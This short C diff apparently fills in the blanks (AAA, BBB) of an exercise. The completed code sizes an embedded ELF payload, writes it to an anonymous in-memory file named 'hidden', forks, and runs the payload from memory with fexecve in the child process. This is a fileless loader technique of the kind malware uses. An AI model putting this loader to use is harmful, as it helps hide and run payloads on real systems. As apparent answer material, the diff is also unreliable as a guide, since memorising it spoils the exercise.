@@ -67,7 +67,7 @@ int main(int argc, char *argv[], char **envp)
         goto cleanup;
     }
 
-    int newsize = AAA;
+    int newsize = size - (newelf - entirefile);
     int memfd = memfd_create("hidden", 0);
     if (memfd < 0) {
         printf("Invalid memfd.\n");
@@ -80,7 +80,7 @@ int main(int argc, char *argv[], char **envp)
 
     // Deploy the payload as a different process
     fork();
-    if (BBB) {
+    if (getpid() != pid) {
         ret = fexecve(memfd, argv, envp); /* Execute the in-memory ELF */
         /* The above will only return if there is an error. */
         printf("Fail to execute payload. ret=%d (%s)\n", ret, strerror(errno));
